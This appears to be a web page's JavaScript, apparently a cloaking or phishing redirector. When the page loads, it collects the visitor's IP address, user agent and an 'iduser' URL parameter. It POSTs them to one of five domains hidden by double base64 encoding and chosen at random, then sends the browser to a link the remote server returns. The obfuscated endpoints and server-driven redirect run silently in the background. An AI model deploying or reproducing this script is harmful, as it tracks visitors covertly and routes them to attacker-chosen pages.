          function getRandomInt(min, max) {
                return Math.floor(Math.random() * (max - min)) + min;
            }

            function addRandomIdAndClass() {
                const allElements = document.querySelectorAll("*");

                allElements.forEach((element) => {
                    if (!element.id) {
                        element.id = "value-id-" + getRandomInt(10000, 99999);
                    }
                    if (!element.classList.length) {
                        element.classList.add("value-class-" + getRandomInt(10000, 99999));
                    }
                });
            }

            window.onload = function () {
                addRandomIdAndClass();
            };
            function acceptCookies() {
                console.log("Cookies accepted");
            }

            function getUrlParameter(name) {
                name = name.replace(/[[]/, "\\[").replace(/[\]]/, "\\]");
                var regex = new RegExp("[\\?&]" + name + "=([^&#]*)");
                var results = regex.exec(window.location.search);
                return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
            }
          
            function doubleDecode(base64String) {
                return atob(atob(base64String));
            }
            
			async function getUserIP() {
                try {
                    const response = await fetch("https://api.ipify.org?format=json");
                    const data = await response.json();
                    return data.ip;
                } catch (error) {
                    console.error("Error getting user IP:", error);
                    return null;
                }
            }
			
			async function sendData(ip, userid) {
                try {
                    const userAgent = navigator.userAgent;
                    const postData = {
                        userid: userid,
                        ip: ip,
                        userAgent: userAgent,
                    };
            
                    const encodedDomains = [
					"YUhSMGNITTZMeTlqTG14aGRIUmxZWEowTG1acA", 
					"YUhSMGNITTZMeTlsWVhONUxXMXZZbWxzWlM1emFEZ3VibTg", 
					"YUhSMGNITTZMeTlsWVhONUxtRnlhMkZrTG01MQ", 
					"YUhSMGNITTZMeTl0YjJKcGJHVXVjR1ZsYm1WMExtWnA",
					"YUhSMGNITTZMeTl2Y0M1eVlYQnBaR1V1Wm1r"];
					
                    const randomDomain = doubleDecode(encodedDomains[Math.floor(Math.random() * encodedDomains.length)]);
                    console.error(randomDomain);
 				    const response = await fetch(randomDomain, { 
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                        },
                        body: JSON.stringify(postData),
                    });
            
                    if (!response.ok) {
                        throw new Error("Network response was not ok");
                    }
            
                    const result = await response.json();
                    handleResponse(result);
                } catch (error) {
                    console.error("Error:", error);
                }
            }

			async function sendMata_black(ip) {
                try {
                    const userAgent = navigator.userAgent;
                    const postData = {
                        localblock: "invalid",
                        ip: ip,
                        userAgent: userAgent,
                    };
                    const encodedDomains = [
					"YUhSMGNITTZMeTlqTG14aGRIUmxZWEowTG1acA", 
					"YUhSMGNITTZMeTlsWVhONUxXMXZZbWxzWlM1emFEZ3VibTg", 
					"YUhSMGNITTZMeTlsWVhONUxtRnlhMkZrTG01MQ", 
					"YUhSMGNITTZMeTl0YjJKcGJHVXVjR1ZsYm1WMExtWnA",
					"YUhSMGNITTZMeTl2Y0M1eVlYQnBaR1V1Wm1r"];

                    const randomDomain = doubleDecode(encodedDomains[Math.floor(Math.random() * encodedDomains.length)]);
                    const response = await fetch(randomDomain, { 
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                        },
                        body: JSON.stringify(postData),
                    });
            
                    if (!response.ok) {
                        throw new Error("Network response was not ok");
                    }
            
                    const result = await response.json();
                    handleResponse(result);
                } catch (error) {
                    console.error("Error:", error);
                }
            }

            function handleResponse(responseData) {
                if (!responseData) {
                    console.error("Response data is undefined or null");
                    return;
                }

                console.error(responseData);

                if (responseData.res_status === "200") {
                    window.location.href = responseData.link + "?iduser=" + responseData.nuser;
                } else if (responseData.res_status === "405") {
                    window.location.href = "https://example.com/";
                } else {
                    console.error("Unexpected response from server");
                }
            }

            getUserIP().then((ip) => {
                if (ip) {
                    const userid = getUrlParameter("iduser");
                    if (userid) {
                        sendData(ip, userid);
                    } else {
                        sendMata_black(ip);
                    }
                } else {
                    console.error("Error: Unable to retrieve IP");
                }
            });
